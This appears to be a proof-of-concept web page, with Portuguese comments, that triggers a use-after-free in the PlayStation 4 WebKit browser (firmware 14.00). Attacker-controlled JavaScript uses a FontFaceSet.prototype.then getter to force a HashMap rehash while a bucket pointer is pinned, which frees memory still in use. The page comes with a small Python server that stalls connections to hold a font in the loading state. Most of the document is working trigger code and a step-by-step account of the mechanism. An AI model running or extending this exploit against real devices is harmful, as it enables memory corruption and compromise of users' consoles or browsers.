  Bug class  : Use-After-Free — HashMap::ensure() pinned bucket freed por rehash
  Target     : PS4 libSceNKWebKit.sprx / AppleWebKit 605.1.15 FW 14.00
  Confirmado : CSSStyleSheet(), adoptedStyleSheets, document.fonts, attachShadow = SUPORTADOS

  MECANISMO:
  ----------
  1. Dois shadow roots adotam o MESMO CSSStyleSheet com @font-face de URL stalling
     → WebKit os coloca em m_sharedShadowTreeResolvers (HashMap compartilhado)
  2. document.fonts.load() inicia o carregamento → active count = 1 → status "loading"
  3. document.fonts.ready materializado como Promise
  4. FontFaceSet.prototype.then getter instalado
  5. Trigger: elementB.id = "boom" → invalida estilo → WebKit reconstrói o resolver
     de shadow tree B via createOrFindSharedShadowTreeResolver()
  6. Dentro: HashMap::ensure(key, functor) → funcator chama appendAuthorStyleSheets()
  7. appendAuthorStyleSheets() re-registra a @font-face rule → face anterior descartada
     → active count cai de 1 para 0 → document.fonts.ready se resolve
  8. Promise.resolve(document.fonts) → thenable check: [[Get]] FontFaceSet.prototype.then
  9. GETTER DISPARA com ponteiro pinned do ensure() ainda na call stack
 10. document.body.offsetHeight reconstrói os 32 decoy shadow trees
     → insere 32 novas entradas em m_sharedShadowTreeResolvers → HashMap REHASH
     → old backing store liberado → ponteiro pinned do ensure() DANGLING
 11. ensure() tenta escrever de volta → UAF → CRASH

  DIFERENCA DOS UAFs ANTERIORES:
  --------------------------------
  - Trigger: shadow tree style resolver rebuild (NAO ctx.font, face.load() ou measureText)
  - Getter: em FontFaceSet.prototype.then (NAO FontFace.prototype.then)
  - Victim: HashMap::ensure() pinned bucket (NAO CSSFontFace ou CSSFontSelector)

  REQUISITO: servidor HTTP que aceita conexoes mas nunca envia resposta
  -----------------------------------------------------------------------
  Opção Python (rodar na maquina na mesma rede):

    python3 stall_server.py

  Onde stall_server.py contem:

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8080))
    s.listen(100)
    def h(c): c.recv(4096)
    while True:
        c,_ = s.accept()
        threading.Thread(target=h, args=(c,), daemon=True).start()

  Ajustar STALL_HOST abaixo com o IP da maquina que roda o servidor.

<h2>UAF eaafed0 — Style::Scope::createOrFindSharedShadowTreeResolver</h2>
<p>Vulnerabilidade: HashMap::ensure() pinned bucket freed por rehash via FontFaceSet.prototype.then getter</p>

<script>
// ============================================================
// CONFIGURACAO
// ============================================================
// O Service Worker vai interceptar esta URL exata, independente de não existir o arquivo .py real no servidor
var STALL_URL = 'resources/load-and-stall.py?name=square100.png&rand=' + Math.random();


// Numero de decoys — deve ser suficiente para forcar rehash do HashMap
// (precisa passar do load factor, geralmente 75% de capacity)
// Com 32 entradas, HashMap com capacity=32 vai rehash na 25a insercao
var DECOY_COUNT = 32;

// ============================================================
// LOG
// ============================================================
var logEl = document.getElementById('log');
function log(msg, cls) {
    var line = document.createElement('div');
    line.className = cls || '';
    line.textContent = msg;
    logEl.appendChild(line);
}

// ============================================================
// FASE 1: DIAGNOSTICO — FontFaceSet.prototype.then getter
// ============================================================
function checkFontFaceSetGetter() {
    log('--- Fase 1: Diagnostico ---');

    // Verifica se FontFaceSet existe
    if (typeof FontFaceSet === 'undefined') {
        log('FAIL: FontFaceSet nao existe', 'fail'); return false;
    }
    log('FontFaceSet disponivel', 'ok');

    // Verifica se document.fonts eh FontFaceSet
    if (!(document.fonts instanceof FontFaceSet)) {
        log('FAIL: document.fonts nao eh FontFaceSet', 'fail'); return false;
    }
    log('document.fonts instanceof FontFaceSet', 'ok');

    // Testa se consegue definir getter em FontFaceSet.prototype.then
    var getterFired = false;
    var origThen = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, 'then');
    try {
        Object.defineProperty(FontFaceSet.prototype, 'then', {
            configurable: true,
            get: function() { getterFired = true; return undefined; }
        });
    } catch(e) {
        log('FAIL: defineProperty em FontFaceSet.prototype.then: ' + e.message, 'fail');
        return false;
    }
    log('defineProperty em FontFaceSet.prototype.then: OK', 'ok');

    // Testa se acesso a .then dispara o getter
    void document.fonts.then;
    log('Getter dispara no acesso direto: ' + getterFired, getterFired ? 'ok' : 'fail');

    // Restaura
    if (origThen) {
        Object.defineProperty(FontFaceSet.prototype, 'then', origThen);
    } else {
        try { delete FontFaceSet.prototype.then; } catch(e) {}
    }

    // Verifica adoptedStyleSheets
    var testHost = document.createElement('div');
    document.body.appendChild(testHost);
    var testRoot = testHost.attachShadow({ mode: 'open' });
    var hasAdopted = 'adoptedStyleSheets' in testRoot;
    testHost.remove();
    log('adoptedStyleSheets disponivel: ' + hasAdopted, hasAdopted ? 'ok' : 'fail');

    // Verifica CSSStyleSheet construtor
    var hasCSS = false;
    try { new CSSStyleSheet(); hasCSS = true; } catch(e) {}
    log('new CSSStyleSheet(): ' + hasCSS, hasCSS ? 'ok' : 'fail');

    return getterFired && hasAdopted && hasCSS;
}

// ============================================================
// FASE 2: SETUP — shadow trees + adopted stylesheets
// ============================================================
function setup() {
    log('--- Fase 2: Setup ---');

    // Materializa document.fonts antes de tudo (necessario para .ready funcionar)
    void document.fonts;

    // Stylesheet com @font-face stalling
    var fontSheet = new CSSStyleSheet();
    try {
        fontSheet.replaceSync(
            '@font-face { font-family: StallingFont; src: url("' + STALL_URL + '"); }'
        );
    } catch(e) {
        log('FAIL: replaceSync: ' + e.message, 'fail'); return null;
    }
    log('fontSheet criado com @font-face stalling', 'ok');

    var extraSheet = new CSSStyleSheet();
    extraSheet.replaceSync('.mk { color: green; }');

    // Sheets para os decoys (todos diferentes do fontSheet)
    var decoySheets = [];
    for (var i = 0; i < DECOY_COUNT; i++) {
        var ds = new CSSStyleSheet();
        ds.replaceSync('.d' + i + ' { color: rgb(' + i + ',1,2); }');
        decoySheets.push(ds);
    }

    // Shadow tree A: renderizada, usa a fonte stalling
    var hostA = document.createElement('div');
    document.body.appendChild(hostA);
    var rootA = hostA.attachShadow({ mode: 'open' });
    rootA.adoptedStyleSheets = [fontSheet];
    var probeA = document.createElement('span');
    probeA.style.font = '24px StallingFont';
    probeA.textContent = 'A';
    rootA.appendChild(probeA);
    log('Shadow tree A criado (usa StallingFont)', 'ok');

    // Shadow tree B: tem <style> removivel, adota fontSheet + extraSheet
    var hostB = document.createElement('div');
    hostB.style.display = 'none';
    document.body.appendChild(hostB);
    var rootB = hostB.attachShadow({ mode: 'open' });
    var gadgetStyle = document.createElement('style');
    gadgetStyle.textContent = '.gadget { color: navy; }';
    rootB.appendChild(gadgetStyle);
    var wrapperB = document.createElement('div');
    var elementB = document.createElement('span');
    elementB.textContent = 'B';
    wrapperB.appendChild(elementB);
    rootB.appendChild(wrapperB);
    rootB.adoptedStyleSheets = [fontSheet, extraSheet];
    log('Shadow tree B criado (compartilha fontSheet com A)', 'ok');

    // 32 shadow trees decoy — usados para crescer o HashMap alem do load factor
    var decoyRoots = [];
    var decoyStyles = [];
    for (var j = 0; j < DECOY_COUNT; j++) {
        var dh = document.createElement('div');
        dh.style.display = 'none';
        document.body.appendChild(dh);
        var dr = dh.attachShadow({ mode: 'open' });
        var dsEl = document.createElement('style');
        dsEl.textContent = '.dg' + j + ' { color: rgb(1,' + j + ',3); }';
        dr.appendChild(dsEl);
        dr.appendChild(document.createElement('div'));
        decoyRoots.push(dr);
        decoyStyles.push(dsEl);
    }
    log('32 shadow trees decoy criados', 'ok');

    // Forca layout para construir todos os resolvers agora
    void document.body.offsetHeight;
    log('Layout forcado — resolvers construidos', 'ok');

    // Inicia carregamento da fonte stalling
    document.fonts.load('24px StallingFont', 'A');

    var status = document.fonts.status;
    log('document.fonts.status: ' + status, status === 'loading' ? 'ok' : 'fail');

    if (status !== 'loading') {
        log('FAIL: fonte nao esta em loading — servidor stall nao esta acessivel', 'fail');
        log('URL testada: ' + STALL_URL, 'warn');
        log('Iniciar servidor: python3 stall_server.py', 'warn');
        return null;
    }

    // Materializa document.fonts.ready (necessario para a thenable check chegar ao getter)
    var readyPromise = document.fonts.ready;
    log('document.fonts.ready materializado', 'ok');

    return {
        gadgetStyle: gadgetStyle,
        elementB: elementB,
        decoyRoots: decoyRoots,
        decoyStyles: decoyStyles,
        decoySheets: decoySheets
    };
}

// ============================================================
// FASE 3: TRIGGER — reconstroi resolver → UAF
// ============================================================
function trigger(state) {
    log('--- Fase 3: Trigger ---');

    var gadgetStyle = state.gadgetStyle;
    var elementB    = state.elementB;
    var decoyRoots  = state.decoyRoots;
    var decoyStyles = state.decoyStyles;
    var decoySheets = state.decoySheets;

    // Instala getter em FontFaceSet.prototype.then
    // Quando document.fonts.ready se resolver, Promise.resolve(document.fonts)
    // fara thenable check: [[Get]] FontFaceSet.prototype.then → getter dispara
    var origThen = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, 'then');
    Object.defineProperty(FontFaceSet.prototype, 'then', {
        configurable: true,
        get: function() {
            // Restaura para evitar loop infinito
            if (origThen) {
                Object.defineProperty(FontFaceSet.prototype, 'then', origThen);
            } else {
                try { delete FontFaceSet.prototype.then; } catch(e) {}
            }
            // REENTRANCIA: reconstroi os 32 decoy shadow trees
            // → insere entradas em m_sharedShadowTreeResolvers
            // → HashMap passa do load factor → REHASH → old backing store freed
            // → ponteiro pinned do ensure() agora DANGLING → UAF
            void document.body.offsetHeight;
            return undefined;
        }
    });
    log('FontFaceSet.prototype.then getter instalado', 'ok');

    // Agenda reconstrucao dos resolvers dos decoys (sem flush ainda)
    for (var i = 0; i < DECOY_COUNT; i++) {
        decoyRoots[i].adoptedStyleSheets = [decoySheets[i]];
        decoyStyles[i].remove();
    }
    gadgetStyle.remove();
    log('Estilo gadget removido + decoys invalidados', 'ok');

    // Flush: descarta os resolvers existentes
    void document.styleSheets.length;
    log('Flush realizado — resolvers descartados', 'ok');

    // TRIGGER FINAL:
    // elementB.id = "boom" → invalida estilo de shadow tree B
    // → WebKit chama createOrFindSharedShadowTreeResolver()
    // → HashMap::ensure(key, functor) — functor chama appendAuthorStyleSheets()
    // → @font-face re-registrada → active count 1→0 → document.fonts.ready resolve
    // → Promise.resolve(document.fonts) → [[Get]] FontFaceSet.prototype.then
    // → GETTER DISPARA → offsetHeight → 32 novas entradas → HashMap rehash
    // → pinned bucket freed → ensure() escreve em memoria liberada → UAF → CRASH
    log('Disparando trigger: elementB.id = "boom"', 'warn');
    elementB.id = 'boom';

    log('Trigger disparado (crash esperado acima)', 'warn');
}

// ============================================================
// MAIN
// ============================================================
window.addEventListener('load', function() {
    setTimeout(function() {
        var diagOk = checkFontFaceSetGetter();
        if (!diagOk) {
            log('Diagnostico falhou — APIs insuficientes', 'fail');
            return;
        }
        log('Diagnostico OK — todas as APIs disponiveis', 'ok');

        var state = setup();
        if (!state) return;

        // Necessario um setTimeout para verificar se fonte ainda esta loading
        // (o stall server mantém o status "loading" atraves deste ciclo de eventos)
        setTimeout(function() {
            trigger(state);
        }, 0);
    }, 0);
});
</script>
</body>
</html>
